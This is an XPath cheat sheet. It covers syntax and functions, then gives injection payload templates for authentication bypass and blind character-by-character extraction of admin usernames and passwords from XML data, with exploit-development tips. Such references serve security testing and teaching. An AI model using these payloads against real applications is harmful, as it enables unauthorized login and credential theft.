# XPath Cheat Sheet 


## 1. Core Concepts

### Node Selection

- `/` — absolute path
    
- `//` — anywhere in the document
    
- `.` — current node
    
- `..` — parent node
    
- `@` — attribute access
    

### Examples:

```xpath
/user/username       - selects <username> under <user>
//user               - selects all <user> elements in the document
//user[1]            - selects the first <user> anywhere
```

---

## 2. Predicates and Filters

- `[condition]` — filter nodes based on condition
    
- `[1]`, `[2]`, etc. — index-based selection (1-indexed)
    

### Examples:

```xpath
//user[role='admin']             - selects all users with role 'admin'
//user[role='admin'][1]          - selects the first admin user
//user[username='alice']         - user with username alice
```

---

## 3. Functions for Blind Injection

### `substring(string, start, length)`

Extracts a substring starting at `start` for `length` characters (1-based index).

```xpath
substring(username/text(), 1, 1) = 'a'
```

### `contains(string, substring)`

Returns true if `string` contains `substring`.

```xpath
contains(username/text(), 'adm')
```

### `string-length(string)`

Returns the number of characters in a string.

```xpath
string-length(password/text()) > 10
```

### `not(condition)`

Logical NOT operator.

```xpath
not(username='guest')
```

### `normalize-space(string)`

Strips leading/trailing whitespace and collapses internal spacing.

---

## 4. Logical Operators

- `and`, `or` — logical conjunction/disjunction
    
- `=`, `!=` — equality/inequality
    
- `<`, `>`, `<=`, `>=` — comparison operators
    

### Examples:

```xpath
//user[username='alice' and role='admin']
//user[username='alice' or username='bob']
```

---

## 5. Injection Strategy Examples

### Truth-based Authentication Bypass:

```xpath
' or 'a'='a
```

### Character-by-Character Blind Extraction:

```xpath
' or substring(//user[role='admin'][1]/username/text(), 1, 1) = 'a' or '
```

### Full Username Prefix Test:

```xpath
' or substring(//user[role='admin'][1]/username/text(), 1, 3) = 'adm' or '
```

### Conditional Length Check:

```xpath
' or string-length(//user[role='admin'][1]/password/text()) > 10 or '
```

---

## 6. Notes for Exploit Development

- XPath indexing is 1-based, not 0-based
    
- Quotes must be balanced: use `' or 'a'='a' or '` to fully close the injected predicate
    
- You cannot use wildcards like `*` inside strings; use `contains()` or `substring()`
    
- XPath 1.0 has no native `sleep()` or delay function — inference relies on response differences
    
- In XML with multiple matching nodes, XPath will return the **first match** when using `[1]`
    

---

## 7. Quick Payload Templates

### True Condition:

```xpath
' or 'x'='x
```

### False Condition:

```xpath
' and 'x'='y
```

### Substring Match:

```xpath
' or substring(//user[role='admin'][1]/password/text(), {pos}, 1) = '{char}' or '
```

### Username Discovery Loop:

```xpath
' or substring(//user[role='admin'][{index}]/username/text(), {pos}, 1) = '{char}' or '
```

---

## References

- XPath 1.0 spec: [https://www.w3.org/TR/xpath](https://www.w3.org/TR/xpath)
    
- OWASP XPath Injection: [https://owasp.org/www-community/attacks/XPATH_Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
